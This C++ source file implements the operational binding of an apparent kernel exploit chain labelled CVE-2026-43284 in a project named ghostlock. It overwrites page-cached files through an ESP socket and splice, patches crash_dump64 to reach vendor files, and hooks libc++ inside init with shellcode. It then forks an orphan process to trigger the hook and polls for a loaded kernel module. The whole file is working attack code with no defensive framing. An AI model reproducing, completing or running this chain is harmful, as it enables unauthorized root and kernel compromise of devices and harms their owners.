/* B5-9a/B5-9c real_ops binding -- implementation. See real_ops.hpp. */

#include "backend/cve_2026_43284/real_ops.hpp"

#include <cerrno>
#include <chrono>
#include <cstddef>
#include <cstdint>
#include <sys/types.h>
#include <thread>
#include <type_traits>
#include <unistd.h>

#if defined(__linux__)
#include <sys/wait.h>
#endif

namespace ghostlock::backend::cve_2026_43284 {
    namespace {
        constexpr std::size_t kBlockBytes = 16U;

        /* Shared 16-byte pread loop: 16 on success, -EIO on short/EOF and the
         * negative errno on failure. Never advances a shared file offset. */
        long pread_block(int fd, std::uint64_t offset,
                         std::uint8_t out[16]) noexcept {
            if (fd < 0) {
                return -EBADF;
            }
            std::size_t total = 0U;
            while (total < kBlockBytes) {
                const off_t position = static_cast<off_t>(offset) +
                                       static_cast<off_t>(total);
                const ssize_t got = ::pread(fd, out + total, kBlockBytes - total, position);
                if (got < 0) {
                    if (errno == EINTR) {
                        continue;
                    }
                    return -errno;
                }
                if (got == 0) {
                    return -EIO;
                }
                total += static_cast<std::size_t>(got);
            }
            return static_cast<long>(kBlockBytes);
        }

        /* The ChainOps contract routes every callback through write.ctx, which
         * make_file_cache_write_ops() sets to &page. RealChainContext keeps
         * page as its first member, so the two views are
         * pointer-interconvertible. */
        static_assert(std::is_standard_layout_v<RealChainContext>,
                      "RealChainContext must be standard-layout");
        static_assert(std::is_standard_layout_v<PageCacheWriteContext>,
                      "PageCacheWriteContext must be standard-layout");
        static_assert(offsetof(RealChainContext, page) == 0U,
                      "page must be the first RealChainContext member");

        RealChainContext *context_from_page(void *raw) noexcept {
            return reinterpret_cast<RealChainContext *>(raw);
        }

        /* crash_dump64 offset-16 verify read: the context is the crash_dump
         * PageCacheWriteContext, whose file_fd is the crash_dump64 target. */
        long crash_dump_verify_read16(void *raw, std::uint64_t offset,
                                      std::uint8_t out[16]) noexcept {
            if (raw == nullptr || out == nullptr) {
                return -EINVAL;
            }
            auto *page = static_cast<PageCacheWriteContext *>(raw);
            return pread_block(page->file_fd, offset, out);
        }

        /* Pagecache old-block source for the carrier write. The App/shell can
         * read /system files directly, but a vendor carrier is read through the
         * patched crash_dump64 bridge. The ctx is &RealChainContext::page, so
         * context_from_page() recovers the full chain context. */
        long real_chain_old_page_read16(void *raw, std::uint64_t offset,
                                        std::uint8_t out[16]) noexcept {
            if (raw == nullptr || out == nullptr) {
                return -EINVAL;
            }
            auto *ctx = context_from_page(raw);
            if (ctx->target_path != nullptr &&
                steps::is_vendor_path(ctx->target_path) && ctx->bridge.available()) {
                return ctx->bridge.read16(ctx->bridge.ctx, ctx->target_path, offset,
                                          out);
            }
            return pread_block(ctx->page.file_fd, offset, out);
        }

        /* Helper write source for a vendor carrier the App cannot open at all
         * (file_fd < 0): the already-patched crash_dump64 splice(2)s the target
         * page directly into the writer's pipe (exp.c do_one_write_cbc
         * use_helper=1). The ctx is &RealChainContext::page. */
        long real_chain_helper_splice16(void *raw, int pipe_write_fd,
                                        std::uint64_t offset) noexcept {
            if (raw == nullptr) {
                return -EINVAL;
            }
            auto *ctx = context_from_page(raw);
            if (ctx->target_path == nullptr ||
                !steps::is_vendor_path(ctx->target_path) ||
                !ctx->bridge.available()) {
                return -ENOSYS;
            }
            return ctx->bridge.splice16_into_pipe(
                    ctx->bridge.ctx, ctx->target_path, offset, pipe_write_fd);
        }

        /* B5-9h-4 hook write face: frame one 16-byte block over the hook
         * target's page cache exactly like the carrier. write16 returns the
         * pagecache::WriteResult as int32 (0 == Ok) for HookPatchIo; read16
         * maps it back to a 16-byte read or -EIO. */
        std::int32_t real_hook_write16_adapter(void *raw, std::uint64_t offset,
                                               const void *bytes16) noexcept {
            if (raw == nullptr || bytes16 == nullptr) {
                return static_cast<std::int32_t>(WriteResult::InvalidArgument);
            }
            auto &page = *static_cast<PageCacheWriteContext *>(raw);
            return static_cast<std::int32_t>(
                    write16(page, offset, static_cast<const std::uint8_t *>(bytes16)));
        }

        long real_hook_read16_adapter(void *raw, std::uint64_t offset,
                                      std::uint8_t out[16]) noexcept {
            if (raw == nullptr || out == nullptr) {
                return -EINVAL;
            }
            auto &page = *static_cast<PageCacheWriteContext *>(raw);
            const WriteResult result = read_block(page, offset, out);
            return result == WriteResult::Ok ? static_cast<long>(kBlockBytes)
                                             : -EIO;
        }

        [[nodiscard]] bool probe_exists(const platform::DeviceProbeOps &device,
                                        const char *path) noexcept {
            if (device.file_fact == nullptr || path == nullptr) {
                return false;
            }
            platform::FileFact fact{};
            if (!device.file_fact(device.ctx, path, fact)) {
                return false;
            }
            return fact.exists;
        }
    } // namespace

    long real_read_block(void *raw, std::uint64_t offset,
                         std::uint8_t out[16]) noexcept {
        if (raw == nullptr || out == nullptr) {
            return -EINVAL;
        }
        auto *ctx = static_cast<ReadOnlyChainContext *>(raw);
        if (ctx->fd < 0) {
            return -EBADF;
        }
        return pread_block(ctx->fd, offset, out);
    }

    steps::ChainOps make_read_only_chain_ops(ReadOnlyChainContext &ctx) noexcept {
        steps::ChainOps ops{};
        ops.write.ctx = &ctx;
        ops.read_block = real_read_block;
        return ops;
    }

    steps::HookPatchIo make_real_hook_io(PageCacheWriteContext &hook_page) noexcept {
        steps::HookPatchIo io{};
        /* Derive availability from the same page-cache readiness predicate the
         * carrier write uses: write surface + ESP socket + ICV + a ciphertext
         * page source. An unopenable hook file stays usable only through the
         * helper write source. */
        if (make_file_cache_write_ops(hook_page).write16 == nullptr) {
            return io;
        }
        io.ctx = &hook_page;
        io.write16 = &real_hook_write16_adapter;
        io.read16 = &real_hook_read16_adapter;
        return io;
    }

    long real_chain_hook_old_page_read16(void *raw, std::uint64_t offset,
                                         std::uint8_t out[16]) noexcept {
        if (raw == nullptr || out == nullptr) {
            return -EINVAL;
        }
        auto *ctx = context_from_page(raw);
        if (ctx->hook_path == nullptr || !ctx->bridge.available()) {
            return -ENOSYS;
        }
        return ctx->bridge.read16(ctx->bridge.ctx, ctx->hook_path, offset, out);
    }

    long real_chain_hook_helper_splice16(void *raw, int pipe_write_fd,
                                         std::uint64_t offset) noexcept {
        if (raw == nullptr) {
            return -EINVAL;
        }
        auto *ctx = context_from_page(raw);
        if (ctx->hook_path == nullptr || !ctx->bridge.available()) {
            return -ENOSYS;
        }
        return ctx->bridge.splice16_into_pipe(ctx->bridge.ctx, ctx->hook_path,
                                              offset, pipe_write_fd);
    }

    long real_chain_read_block(void *raw, std::uint64_t offset,
                               std::uint8_t out[16]) noexcept {
        if (raw == nullptr || out == nullptr) {
            return -EINVAL;
        }
        RealChainContext *ctx = context_from_page(raw);
        /* Direct pread first: upstream read_vendor_content prefers the direct
         * file source whenever the app domain can open it. */
        if (ctx->page.file_fd >= 0) {
            const long direct = pread_block(ctx->page.file_fd, offset, out);
            if (direct == static_cast<long>(kBlockBytes) ||
                !ctx->bridge.available() || ctx->target_path == nullptr ||
                !steps::is_vendor_path(ctx->target_path)) {
                return direct;
            }
        }
        if (ctx->bridge.available() && ctx->target_path != nullptr &&
            steps::is_vendor_path(ctx->target_path)) {
            return ctx->bridge.read16(ctx->bridge.ctx, ctx->target_path, offset, out);
        }
        return -EBADF;
    }

    steps::ChainError real_chain_patch_crash_dump(void *raw) noexcept {
        if (raw == nullptr) {
            return steps::ChainError::NotAvailable;
        }
        RealChainContext *ctx = context_from_page(raw);
        if (ctx->crash_dump_fd < 0) {
            return steps::ChainError::NotAvailable;
        }
        /* A second page-cache view sharing the session SA/socket/io with the
         * carrier context but bound to the crash_dump64 fd (exp.c patch_ko
         * opens a fresh file/socket per patch_file_cbc; sharing the socket is
         * equivalent for the sequential, single-run endgame). */
        PageCacheWriteContext crash{};
        crash.sa = ctx->page.sa;
        crash.file_fd = ctx->crash_dump_fd;
        crash.socket_fd = ctx->page.socket_fd;
        crash.next_seq = ctx->page.next_seq;
        crash.pipe_flags = ctx->page.pipe_flags;
        crash.io = ctx->page.io;
        steps::CrashDumpPatchOps patch{};
        patch.write = make_file_cache_write_ops(crash);
        patch.read16 = &crash_dump_verify_read16;
        const steps::CrashDumpPatchError error = steps::patch_crash_dump(patch);
        ctx->page.next_seq = crash.next_seq;
        return error == steps::CrashDumpPatchError::None
                       ? steps::ChainError::None
                       : steps::ChainError::CrashDumpFailed;
    }

    steps::ChainError real_chain_apply_hook(void *raw) noexcept {
        if (raw == nullptr) {
            return steps::ChainError::NotAvailable;
        }
        RealChainContext *ctx = context_from_page(raw);
        if (ctx->libcxx_image == nullptr || ctx->hook_shellcode == nullptr ||
            ctx->hook_shellcode_orig == nullptr || !ctx->hook_io.available()) {
            return steps::ChainError::NotAvailable;
        }
        const std::string_view symbol =
                ctx->hook_symbol.empty()
                        ? std::string_view(steps::kLibcxxSentrySymbol)
                        : ctx->hook_symbol;

        /* The embedded upstream libcxx.S is the default template: the caller
         * only has to supply the libc++.so image, the buffers and the write
         * surface. The carrier path is bound from target_path; an explicit
         * template/binding array still overrides it. */
        steps::ShellcodeTemplate default_template{};
        steps::ShellcodeBinding default_bindings[steps::kLibcxxValueSlotCount]{};
        std::size_t default_binding_count = 0U;
        const steps::ShellcodeTemplate *tmpl = ctx->hook_template;
        const steps::ShellcodeBinding *hook_bindings = ctx->hook_bindings;
        std::size_t binding_count = ctx->hook_binding_count;
        std::size_t displaced_slot = ctx->hook_displaced_slot;
        if (tmpl == nullptr) {
            steps::LibcxxHookBindings libcxx{};
            libcxx.carrier_path = ctx->target_path != nullptr
                                          ? std::string_view(ctx->target_path)
                                          : std::string_view{};
            steps::ShellcodeError binding_error = steps::ShellcodeError::None;
            if (!steps::make_libcxx_hook_bindings(libcxx, default_bindings,
                                                  default_binding_count,
                                                  binding_error)) {
                return steps::ChainError::HookFailed;
            }
            default_template = steps::libcxx_shellcode_template();
            tmpl = &default_template;
            hook_bindings = default_bindings;
            binding_count = default_binding_count;
            displaced_slot = steps::kLibcxxSlotDisplaced;
        }

        /* The hook target shares the carrier's ESP SA/socket, so its block
         * writes must continue the carrier's sequence numbers (a reset would
         * be dropped by anti-replay). Copy the counter in before the reads, and
         * hand the advanced counter back after the writes. */
        ctx->hook_page.next_seq = ctx->page.next_seq;

        steps::HookPatchError error = steps::HookPatchError::None;
        if (!steps::plan_hook_patch(ctx->libcxx_image, ctx->libcxx_image_size,
                                    symbol, ctx->hook_guard, *tmpl, hook_bindings,
                                    binding_count, displaced_slot,
                                    ctx->hook_shellcode, ctx->hook_shellcode_cap,
                                    ctx->hook_shellcode_orig, ctx->hook_io,
                                    ctx->hook_plan, error)) {
            return steps::ChainError::HookFailed;
        }
        /* The plan holds the saved original bytes: arm the restore before the
         * first write so a partial apply is still rolled back at the terminus.
         * Restoring a not-yet-written region rewrites identical bytes. */
        ctx->hook_applied = true;
        const bool applied =
                steps::apply_hook_patch(ctx->hook_plan, ctx->hook_io, error);
        ctx->page.next_seq = ctx->hook_page.next_seq;
        return applied ? steps::ChainError::None : steps::ChainError::HookFailed;
    }

    bool real_chain_restore_hook(void *raw) noexcept {
        if (raw == nullptr) {
            return false;
        }
        RealChainContext *ctx = context_from_page(raw);
        if (!ctx->hook_applied) {
            return false;
        }
        /* The restore writes through the same ESP SA/socket; keep the sequence
         * counter continuous with the carrier and the apply. */
        ctx->hook_page.next_seq = ctx->page.next_seq;
        steps::HookPatchError error = steps::HookPatchError::None;
        (void)steps::restore_hook_patch(ctx->hook_plan, ctx->hook_io, error);
        ctx->page.next_seq = ctx->hook_page.next_seq;
        ctx->hook_applied = false;
        return true;
    }

    int real_chain_trigger(void *raw) noexcept {
        if (raw == nullptr) {
            return -EINVAL;
        }
        RealChainContext *ctx = context_from_page(raw);
#if defined(__linux__)
        /* exp.c createOrphanProcess: the intermediate child exits immediately so
         * the grandchild is reparented to init. The grandchild sleeps (or execs
         * the configured target) and then exits; init reaps it on thread 1 and
         * reaches the hooked libc++ sentry. */
        const pid_t child = ::fork();
        if (child < 0) {
            return -errno;
        }
        if (child == 0) {
            const pid_t grandchild = ::fork();
            if (grandchild < 0) {
                ::_exit(127);
            }
            if (grandchild == 0) {
                if (ctx->trigger_delay_ms != 0U) {
                    ::usleep(static_cast<useconds_t>(ctx->trigger_delay_ms) * 1000U);
                }
                if (ctx->exec_path != nullptr) {
                    ::execl(ctx->exec_path, ctx->exec_path,
                            static_cast<char *>(nullptr));
                }
                ::_exit(0);
            }
            ::_exit(0);
        }
        int status = 0;
        while (::waitpid(child, &status, 0) < 0) {
            if (errno != EINTR) {
                return -errno;
            }
        }
        ctx->triggered = true;
        return 0;
#else
        (void)ctx;
        return -ENOSYS;
#endif
    }

    steps::ChainWaitOutcome real_chain_wait_result(void *raw,
                                                   std::uint32_t timeout_ms) noexcept {
        if (raw == nullptr) {
            return steps::ChainWaitOutcome::Pending;
        }
        RealChainContext *ctx = context_from_page(raw);
        if (!ctx->device.available()) {
            return steps::ChainWaitOutcome::Pending;
        }
        const auto start = std::chrono::steady_clock::now();
        bool module_seen = false;
        for (;;) {
            /* Failure first: a stale success marker must not mask a fresh
             * failure marker. */
            if (probe_exists(ctx->device, kLkmFailureMarker)) {
                return steps::ChainWaitOutcome::Failed;
            }
            if (probe_exists(ctx->device, kLkmSuccessMarker)) {
                return steps::ChainWaitOutcome::LkmLoaded;
            }
            /* /dev/df is the shellcode mutex marker ("module loading in
             * flight"). It is deliberately not terminal: observing it only
             * means the hook fired, so the wait keeps polling. */
            (void)probe_exists(ctx->device, kLkmHookMarker);
            const bool module_present = probe_exists(ctx->device, kLkmModulePath);
            if (module_present) {
                module_seen = true;
            } else if (module_seen) {
                /* The LKM was observed loaded and is now gone: it finished the
                 * UMH and self-unloaded (it returns -E2BIG). The ksud markers
                 * were checked first, so neither exists and the module
                 * completed without a success marker. */
                return steps::ChainWaitOutcome::Failed;
            }
            const auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                    std::chrono::steady_clock::now() - start);
            if (elapsed.count() >= static_cast<std::chrono::milliseconds::rep>(timeout_ms)) {
                return steps::ChainWaitOutcome::Timeout;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    }

    void real_chain_release(void *raw) noexcept {
        if (raw == nullptr) {
            return;
        }
        RealChainContext *ctx = context_from_page(raw);
        /* Exactly-once terminus: the chain's finish() calls the bound release
         * callback once, and the staged/production callers may also call this
         * directly on a pre-chain rejection. The guard makes the second call a
         * no-op instead of re-closing fds that may already be reused. */
        if (ctx->released) {
            return;
        }
        const int file_fd = ctx->page.file_fd;
        const int socket_fd = ctx->page.socket_fd;
        const int crash_dump_fd = ctx->crash_dump_fd;
        /* The hook target has its own fd; its socket aliases page.socket_fd, so
         * only the distinct hook fd is closed here. */
        const int hook_fd = ctx->hook_page.file_fd;
        ctx->page.file_fd = -1;
        ctx->page.socket_fd = -1;
        ctx->crash_dump_fd = -1;
        ctx->hook_page.file_fd = -1;
        ctx->hook_page.socket_fd = -1;
        const auto close_distinct = [&](int fd) noexcept {
            if (fd < 0 || fd == file_fd || fd == socket_fd ||
                fd == crash_dump_fd) {
                return;
            }
            if (ctx->page.io.close_fd != nullptr) {
                (void)ctx->page.io.close_fd(fd);
            } else {
                (void)::close(fd);
            }
        };
        const auto close_one = [&](int fd) noexcept {
            if (fd < 0) {
                return;
            }
            if (ctx->page.io.close_fd != nullptr) {
                (void)ctx->page.io.close_fd(fd);
            } else {
                (void)::close(fd);
            }
        };
        close_one(file_fd);
        if (socket_fd != file_fd) {
            close_one(socket_fd);
        }
        close_distinct(crash_dump_fd);
        close_distinct(hook_fd);
        /* Wipe the session secrets through the non-elidable vol-store path. */
        zeroize(ctx->page);
        zeroize(ctx->hook_page);
        ctx->released = true;
    }

    steps::ChainOps make_real_chain_ops(RealChainContext &ctx) noexcept {
        if (!ctx.page.io.available()) {
            ctx.page.io = pagecache::real_splice_io();
        }
        if (!ctx.bridge.available()) {
            ctx.bridge = steps::real_crash_dump_bridge();
        }
        /* Vendor carriers read the old block through the crash_dump bridge;
         * bind the injected source only when that bridge exists so a non-Linux
         * host keeps the direct file_fd path untouched. The callback still
         * prefers the direct pread for non-vendor targets. */
        if (ctx.bridge.available()) {
            ctx.page.old_page.ctx = &ctx.page;
            ctx.page.old_page.read16 = &real_chain_old_page_read16;
            /* The helper write source is the second fallback: it is only
             * meaningful for a vendor carrier the App may fail to open. */
            if (ctx.target_path != nullptr &&
                steps::is_vendor_path(ctx.target_path)) {
                ctx.page.helper_write.ctx = &ctx.page;
                ctx.page.helper_write.splice16 = &real_chain_helper_splice16;
            }
        }
        /* B5-9h-4: bind the hook stage only when the caller armed every asset
         * (image + both shellcode buffers + a usable page-cache write face).
         * An unarmed context leaves apply_hook/restore_hook null so the chain
         * reports hook=0 instead of failing closed late. */
        const bool hook_armed =
                ctx.libcxx_image != nullptr && ctx.hook_shellcode != nullptr &&
                ctx.hook_shellcode_orig != nullptr && ctx.hook_io.available();
        steps::ChainOps ops{};
        ops.write = make_file_cache_write_ops(ctx.page);
        ops.patch_crash_dump = real_chain_patch_crash_dump;
        ops.read_block = real_chain_read_block;
        ops.apply_hook = hook_armed ? real_chain_apply_hook : nullptr;
        ops.restore_hook = hook_armed ? real_chain_restore_hook : nullptr;
        ops.trigger = real_chain_trigger;
        ops.wait_result = real_chain_wait_result;
        ops.release = real_chain_release;
        return ops;
    }

    bool RealChainContext::run_ready() noexcept {
        if (!device.available()) {
            return false;
        }
        const steps::ChainOps ops = make_real_chain_ops(*this);
        return ops.run_ready();
    }

    std::string_view chain_error_name(steps::ChainError error) noexcept {
        switch (error) {
            case steps::ChainError::None: return "None";
            case steps::ChainError::NotAvailable: return "NotAvailable";
            case steps::ChainError::NoCarrier: return "NoCarrier";
            case steps::ChainError::CarrierUnusable: return "CarrierUnusable";
            case steps::ChainError::InvalidPlan: return "InvalidPlan";
            case steps::ChainError::TargetOutOfBounds: return "TargetOutOfBounds";
            case steps::ChainError::PreImageMismatch: return "PreImageMismatch";
            case steps::ChainError::WriteFailed: return "WriteFailed";
            case steps::ChainError::ReadFailed: return "ReadFailed";
            case steps::ChainError::VerifyMismatch: return "VerifyMismatch";
            case steps::ChainError::RollbackFailed: return "RollbackFailed";
            case steps::ChainError::CrashDumpFailed: return "CrashDumpFailed";
            case steps::ChainError::HookFailed: return "HookFailed";
            case steps::ChainError::TriggerFailed: return "TriggerFailed";
            case steps::ChainError::LkmFailed: return "LkmFailed";
            case steps::ChainError::WaitTimeout: return "WaitTimeout";
            case steps::ChainError::CleanupFailed: return "CleanupFailed";
        }
        return "Unknown";
    }

    std::string_view chain_wait_name(steps::ChainWaitOutcome outcome) noexcept {
        switch (outcome) {
            case steps::ChainWaitOutcome::Pending: return "Pending";
            case steps::ChainWaitOutcome::LkmLoaded: return "LkmLoaded";
            case steps::ChainWaitOutcome::Failed: return "Failed";
            case steps::ChainWaitOutcome::Timeout: return "Timeout";
        }
        return "Unknown";
    }
} // namespace ghostlock::backend::cve_2026_43284
